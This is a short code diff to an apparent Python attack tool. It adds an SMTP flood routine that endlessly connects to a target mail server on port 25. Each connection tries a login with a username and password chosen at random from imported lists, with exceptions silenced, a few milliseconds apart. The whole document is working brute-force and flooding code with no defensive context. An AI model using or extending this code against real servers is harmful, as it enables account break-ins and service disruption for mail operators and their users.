@@ -1,11 +1,20 @@
+import smtplib
 import random
 import threading
 import time
-
-SMTP_SERVER_IP = ""
+from utils import usernames, passwords, SMTP_SERVER_IP
 
 def smtp_flood_work(target_host):
     while True:
+        username = random.choice(usernames)
+        password = random.choice(passwords)
+        server = smtplib.SMTP(target_host, 25)
+        try:
+            server.login(username, password)
+        except:
+            ...
+        finally:
+            server.close()
         time.sleep(random.randrange(5)/1000)
 
 def smtp_flood(target_host):
